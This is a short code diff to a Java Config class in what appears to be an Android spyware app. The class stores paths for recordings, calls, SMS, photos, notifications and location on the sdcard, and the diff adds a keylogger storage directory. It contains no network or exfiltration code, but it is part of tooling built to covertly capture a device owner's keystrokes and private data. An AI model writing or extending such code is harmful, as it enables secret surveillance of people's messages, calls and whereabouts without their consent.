@@ -23,6 +23,7 @@ public class Config {
     public static String ZIP_PATH;
     public static String NOTIFICATION_PATH;
     public static String LOCATION_PATH;
+    public static String KEYLOGGER_PATH;
 
     public static void load(SharedPreferences preferences) {
         _preferences = preferences;
@@ -36,12 +37,13 @@ public class Config {
         ZIP_PATH = preferences.getString("ZIP_PATH", "sdcard/Android/zip/");
         NOTIFICATION_PATH = preferences.getString("NOTIFICATION_PATH", "sdcard/Android/notification/");
         LOCATION_PATH = preferences.getString("LOCATION_PATH", "sdcard/Android/location/");
+        KEYLOGGER_PATH = preferences.getString("KEYLOGGER_PATH", "sdcard/Android/keylogger/");
 
         checkDirectories();
     }
 
     private static void checkDirectories() {
-        String[] dirs = {RECORD_PATH,CALLS_PATH,SMS_PATH,PHOTOS_PATH,ZIP_PATH,NOTIFICATION_PATH,LOCATION_PATH};
+        String[] dirs = {RECORD_PATH,CALLS_PATH,SMS_PATH,PHOTOS_PATH,ZIP_PATH,NOTIFICATION_PATH,LOCATION_PATH, KEYLOGGER_PATH};
         for (String dir : dirs) {
             File file = new File(dir);
             if (!file.exists()) file.mkdir();
